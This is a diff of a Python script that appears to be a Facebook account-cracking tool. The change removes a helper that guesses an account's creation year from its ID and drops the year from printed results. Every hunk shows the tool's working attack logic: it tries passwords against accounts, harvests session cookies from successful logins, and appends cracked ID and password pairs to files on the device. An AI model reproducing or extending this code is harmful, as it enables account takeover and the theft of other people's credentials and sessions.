@@ -1677,37 +1677,6 @@ def passwrd():
 	print(f'  [+] OK : {H}{ok} ')
 	print(f'  [+] CP : {K}{cp} ')
 
-def cektahun(fx):
-	if len(fx)==15:
-		if fx[:10] in ['1000000000']       :tahunz = '2009'
-		elif fx[:9] in ['100000000']       :tahunz = '2009'
-		elif fx[:8] in ['10000000']        :tahunz = '2009'
-		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
-		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
-		elif fx[:6] in ['100001']          :tahunz = '2010'
-		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
-		elif fx[:6] in ['100004']          :tahunz = '2012'
-		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
-		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
-		elif fx[:6] in ['100009']          :tahunz = '2015'
-		elif fx[:5] in ['10001']           :tahunz = '2016'
-		elif fx[:5] in ['10002']           :tahunz = '2017'
-		elif fx[:5] in ['10003']           :tahunz = '2018'
-		elif fx[:5] in ['10004']           :tahunz = '2019'
-		elif fx[:5] in ['10005']           :tahunz = '2020'
-		elif fx[:5] in ['10006']           :tahunz = '2021'
-		elif fx[:5] in ['10009']           :tahunz = '2023'
-		elif fx[:5] in ['10007','10008']:tahunz = '2022'
-		else:tahunz=''
-	elif len(fx) in [9,10]:
-		tahunz = '2008'
-	elif len(fx)==8:
-		tahunz = '2007'
-	elif len(fx)==7:
-		tahunz = '2006'
-	else:tahunz=''
-	return tahunz
-	
 #--------------------[ METODE VALIDATE ]-----------------#
 def validate1(idf,pwv):
 	global loop,ok,cp
@@ -1732,7 +1701,7 @@ def validate1(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='WIH-CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1741,7 +1710,7 @@ def validate1(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='WIH-CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1754,7 +1723,7 @@ def validate1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='BRO-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1764,7 +1733,7 @@ def validate1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='BRO-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1800,7 +1769,7 @@ def validate2(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='WOW-CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1809,7 +1778,7 @@ def validate2(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='KUY-CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1822,7 +1791,7 @@ def validate2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='BRO-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1832,7 +1801,7 @@ def validate2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='BRO-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1886,7 +1855,7 @@ def reguler1(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='WOW-CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1895,7 +1864,7 @@ def reguler1(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='WOW-CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1908,7 +1877,7 @@ def reguler1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='KUY-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
